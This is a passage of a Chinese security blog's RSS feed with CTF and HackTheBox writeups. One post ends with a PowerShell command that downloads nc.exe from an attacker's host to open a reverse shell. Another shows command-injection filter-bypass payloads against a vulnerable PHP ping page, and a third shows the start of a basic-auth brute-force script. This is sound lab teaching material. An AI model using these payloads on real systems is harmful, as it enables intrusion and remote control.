class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ProxyUseDefaultCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-SessionVariable&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TimeoutSec&lt;/span&gt; &amp;lt;Int32&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-TransferEncoding&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;chunked | compress | deflate | &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt; | identity&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UseBasicParsing&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UseDefaultCredentials&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-UserAgent&lt;/span&gt; &amp;lt;String&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-WebSession&lt;/span&gt; &amp;lt;WebRequestSession&amp;gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &amp;lt;CommonParameters&amp;gt;]
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们先开启本地 kali 的 web 服务，将 nc.exe 放进对应文件夹，之后远程执行下列命令，从我们本地服务器将 nc 下载保存至用户 Chris 的目录下&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ComputerName&lt;/span&gt; sniper &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;hris&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.15.11/nc.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hris&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ocuments&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c.exe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;Invoke-WebRequest &lt;span class=&quot;nt&quot;&gt;-Uri&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$url&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Outfile&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$output&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcp0r35n46j31e80na0z9.jpg&quot; alt=&quot;image-20200310183924496&quot; /&gt;&lt;/p&gt;

&lt;p&gt;再远程反弹 shell，成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcp0qosjh7j31e20gotfm.jpg&quot; alt=&quot;image-20200310184122085&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;

&lt;p&gt;上述即为整个越权反弹 shell 的内容，一些很基本的命令结合起来使用就能达到很神奇的效果。&lt;/p&gt;

</description>
        <pubDate>Tue, 10 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/10/PSCredential%E8%B6%8A%E6%9D%83%E5%8F%8D%E5%BC%B9shell/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/10/PSCredential%E8%B6%8A%E6%9D%83%E5%8F%8D%E5%BC%B9shell/</guid>
        
        <category>渗透测试</category>
        
        <category>WINDOWS 提权</category>
        
        
      </item>
    
      <item>
        <title>Hackthebox Nest writeup/Walkthrough/攻略</title>
        <description>
</description>
        <pubDate>Sun, 08 Mar 2020 08:28:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/08/HTB-Nest/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/08/HTB-Nest/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>jekyll实现博客文章加密功能</title>
        <description>
</description>
        <pubDate>Fri, 06 Mar 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/06/jekyll%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/06/jekyll%E6%96%87%E7%AB%A0%E5%8A%A0%E5%AF%86/</guid>
        
        <category>HTB</category>
        
        <category>渗透测试</category>
        
        
      </item>
    
      <item>
        <title>CTFHUB 技能树-Web-RCE-综合过滤 wp</title>
        <description>&lt;h2 id=&quot;题目考点&quot;&gt;题目考点&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;命令执行绕过&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;解题思路&quot;&gt;解题思路&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjclhhorrj310y0u0jwt.jpg&quot; alt=&quot;Xnip2020-03-05_20-57-49&quot; /&gt;&lt;/p&gt;

&lt;p&gt;​		给了源码，发现过滤了 &lt;code class=&quot;highlighter-rouge&quot;&gt;| &amp;amp; ; 空格 cat flag ctfhub&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;​		如果输入上述符号或命令，只会回显其本身而不会被执行，需要一个个绕过&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;preg_match_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/(\||&amp;amp;|;| |\/|cat|flag|ctfhub)/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ping -c 4 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$m&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;命令分隔符&quot;&gt;命令分隔符&lt;/h4&gt;

&lt;p&gt;​		因为 &lt;code class=&quot;highlighter-rouge&quot;&gt;| 和 ;&lt;/code&gt; 被过滤，首先要想办法分隔命令，可以使用多种绕过方法，一般用换行即 &lt;code class=&quot;highlighter-rouge&quot;&gt;%0a %0d&lt;/code&gt; 即可。当然，得抓包修改，直接敲在输入框里肯定不行。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjcnz5t9dj31310u0qtk.jpg&quot; alt=&quot;Xnip2020-03-05_21-00-11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;flag_is_here&lt;/code&gt; 文件夹，下一步是想办法进去&lt;/p&gt;

&lt;h4 id=&quot;绕过空格&quot;&gt;绕过空格&lt;/h4&gt;

&lt;p&gt;方法很多，一般可以使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;${IFS}&lt;/code&gt;，更多请参考谷歌&lt;/p&gt;

&lt;h4 id=&quot;绕过黑名单&quot;&gt;绕过黑名单&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;拼接绕过&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hello world&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; flag
~&lt;span class=&quot;nv&quot;&gt;$ a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;c&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;at&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;flag&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$a$b&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;
hello world
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;单双引号&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;c&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;at f&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;lag
hello world
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;base64绕过&lt;/p&gt;

    &lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Y2F0IGZsYWc=&quot;&lt;/span&gt;|base64 &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
hello world
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjcywtw6kj31cu0u0qkt.jpg&quot; alt=&quot;Xnip2020-03-05_21-10-57&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;找到 flag 文件，运用上述知识继续读 flag&lt;/p&gt;

    &lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;o&quot;&gt;/?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;acd&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lag_is_here&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ac&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;lag_244281822710491&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcjd2bvlntj31cl0u0ngq.jpg&quot; alt=&quot;Xnip2020-03-05_21-12-30&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Thu, 05 Mar 2020 05:20:00 +0800</pubDate>
        <link>http://localhost:4000/2020/03/05/CTFHUB-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4/</link>
        <guid isPermaLink="true">http://localhost:4000/2020/03/05/CTFHUB-%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A4/</guid>
        
        <category>CTFHUB</category>
        
        <category>writeup</category>
        
        
      </item>
    
      <item>
        <title>CTFHUB 技能树-Web-HTTP-基本认证 wp</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://www.ctfhub.com/#/index&quot;&gt;CTFHUB&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;题目考点&quot;&gt;题目考点&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Basic access authentication&lt;/li&gt;
  &lt;li&gt;脚本编写&lt;/li&gt;
  &lt;li&gt;爆破&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;解题思路&quot;&gt;解题思路&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;打开题目链接，发现需要输入用户名和密码才能访问&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzytsmeej31v20oygps.jpg&quot; alt=&quot;01&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;题目提供了常用密码top100，应该是爆破，&lt;del&gt;因为范围很小，所以我们一个个试就好了，&lt;/del&gt;所以我们可以编写简单脚本&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;写脚本前先了解一下基本认证是什么，照搬题目描述：“在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 https://zh.wikipedia.org/wiki/HTTP基本认证”&lt;/p&gt;

    &lt;p&gt;关键的地方如下：&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzyyr0iwj31ce0u01kx.jpg&quot; alt=&quot;02&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;使用 Burp 抓包，添加 Authorization 头字段，使用爆破模块&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzz2qgy5j312y0u01bx.jpg&quot; alt=&quot;03&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;其中，payload 部分编写脚本生成&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzz6i224j312y0u0e07.jpg&quot; alt=&quot;04&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;根据提示，容易猜测用户名为 admin，那么 Authorization 头字段的格式就应该为 &lt;code class=&quot;highlighter-rouge&quot;&gt;Authorization: Basic [base64(admin:密码)]&lt;/code&gt;&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/00831rSTgy1gcfzzb1wfjj312y0u0tyd.jpg&quot; alt=&quot;05&quot; /&gt;&lt;/p&gt;

    &lt;p&gt;通过以下脚本将提供的密码列表按格式生成好&lt;/p&gt;

    &lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
8
9
10
11
12
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;
   
&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/Users/wujing/Downloads/10_million_password_list_top_100.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# print(l[0])
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dic&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;encodestr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;admin:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
